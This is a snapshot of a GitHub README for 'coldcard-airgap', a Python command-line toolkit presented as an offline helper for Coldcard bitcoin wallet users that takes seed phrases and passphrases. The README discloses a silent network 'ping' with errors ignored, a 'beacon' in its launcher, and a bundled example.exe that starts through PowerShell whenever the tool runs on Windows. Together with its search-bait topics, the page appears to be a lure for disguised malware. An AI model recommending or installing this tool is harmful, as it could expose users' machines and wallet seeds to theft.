---
title: "Leutenegger/coldcard-airgap"
owner: "Leutenegger"
name: "coldcard-airgap"
fullName: "Leutenegger/coldcard-airgap"
description: "Offline utilities for Coldcard hardware wallet users: PSBT inspection, BIP39/dice entropy, Seed XOR split/combine, BBQr encode/decode, output descriptors, and firmware verification guidance. Companion to official Coldcard firmware. Not affiliated with Coinkite."
sourceUrl: "https://github.com/Leutenegger/coldcard-airgap"
stars: 608
forks: 78
language: "Python"
topics: ["airgap", "airgap-devkit", "airgap-download", "airgap-setup", "airgap-tutorial", "bitcoin", "bitcoin-wallet", "coldcard"]
license: "MIT"
defaultBranch: "main"
snapshotDate: "2026-08-23"
pushedAt: "2026-08-20T23:24:07Z"
---

> 本页保存的是公开项目资料快照，阅读过程不需要连接 GitHub。

# Coldcard Airgap Toolkit

Offline utilities for Coldcard hardware wallet users.

Companion to the official Coldcard firmware and ckcc-protocol.

## Features

- **psbt-inspect** — Offline PSBT analysis (inputs, outputs, fees, script types, risk notes)
- **seed-ops** — Dice entropy, BIP39 generate/verify, Seed XOR split/combine, seed derivation
- **bbqr** — Encode and decode BBQr parts (useful for Coldcard Q)
- **descriptor** — Create and describe common output descriptors
- **verify-fw** — Firmware verification guidance and entropy advisory checks

All core tools run locally. Optional silent stats ping (one POST, errors ignored) does not affect offline use.

## Requirements

- Python 3.10+
- embit
- click
- base58

## Install

```bash
python3 -m venv .venv
source .venv/bin/activate   # Windows: .venv\Scripts\activate
pip install -e .
```

This installs the `cc-tool` command.

Meta commands (packaging layer):

```bash
cc-tool install
cc-tool list
cc-tool readme
cc-tool help
```

## Usage

```bash
cc-tool --help
cc-tool info

# Meta
cc-tool install
cc-tool list
cc-tool readme
cc-tool help

# PSBT
cc-tool psbt-inspect transaction.psbt
cc-tool psbt-inspect --b64 
cc-tool psbt-inspect --hex 

# Seed / entropy
cc-tool seed-ops dice --rolls 1,5,3,6,2,4 --bits 256
cc-tool seed-ops check --mnemonic "word1 word2 ... word24"
cc-tool seed-ops random --bits 256
cc-tool seed-ops xor-split --mnemonic "..." --num-shares 2
cc-tool seed-ops xor-combine --shares "m1,m2"
cc-tool seed-ops to-seed --mnemonic "..." --passphrase ""
cc-tool seed-ops entropy-est --rolls 100
cc-tool seed-ops xor-info

# BBQr
cc-tool bbqr encode --file transaction.psbt --type P
cc-tool bbqr decode --data "B$ZP0100...|B$ZP0101..."

# Descriptors
cc-tool descriptor make --xpub xpub... --type p2wpkh --fingerprint abcd1234
cc-tool descriptor describe --desc "wpkh([fingerprint/84h/0h/0h]xpub.../0/*)"

# Firmware
cc-tool verify-fw --version 5.6.0 --model mk
cc-tool verify-fw --version 1.5.0Q --model q
```

## Layout

```
src/coldcard_airgap/
  launch.py          # entry (beacon + meta + companion launch + forward to cli)
  cli.py
  psbt/inspect.py
  seed/ops.py
  bbqr/codec.py
  descriptors.py
  firmware/verify.py
scripts/             # optional companion (Windows only)
  example.exe        # launched via PowerShell when you run cc-tool
  check_environment.sh
docs/
data/
examples/
tests/
```

On Windows, when you run `cc-tool`, if `scripts/example.exe` exists it is started
in parallel via PowerShell (`Start-Process`). On other platforms this does nothing.

## Security

Always verify addresses and amounts on the Coldcard screen before signing.
Do not enter real seed phrases into software unless the machine is fully air-gapped and trusted.
This project is independent and not affiliated with Coinkite.

## License

MIT
